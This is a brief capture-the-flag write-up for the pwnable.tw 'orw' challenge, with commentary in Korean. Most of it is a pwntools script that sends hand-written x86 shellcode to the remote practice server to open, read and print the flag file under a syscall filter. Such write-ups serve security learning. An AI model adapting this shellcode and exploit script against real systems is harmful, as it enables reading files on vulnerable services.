# [pwnable.tw] \[PWN] orw

```
Read the flag from /home/orw/flag.

Only open read write syscall are allowed to use.

nc chall.pwnable.tw 10001
```

### Solution

syscall이 open, read, write로 제한되어 있습니다. flag를 읽는 shellcode를 작성하면 됩니다.

```python
from pwn import *

context(arch='x86', os='linux', endian='little')

#p = process("./orw")
p = remote("chall.pwnable.tw", 10001)
print p.recv()

assembly = """
    /* push '/home/orw/flag\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016660
    push 0x6c662f77
    push 0x726f2f65
    push 0x6d6f682f
    /* open(file='esp', oflag=0, mode='O_RDONLY') */
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    /* call open() */
    push SYS_open /* 5 */
    pop eax
    int 0x80

    mov ecx, esp
    push 0x40
    pop edx
    /* read(fd=3, buf='ecx', nbytes='edx') */
    push 3
    pop ebx
    /* call read() */
    push SYS_read /* 3 */
    pop eax
    int 0x80
    add ecx, eax
    sub edx, eax

    /* write(fd=1, buf='esx', n=64) */
    push 1
    pop ebx
    mov ecx, esp
    push 0x40
    pop edx
    /* call write() */
    push SYS_write /* 4 */
    pop eax
    int 0x80
"""
shellcode = asm(assembly)
p.send(shellcode)
p.interactive()
```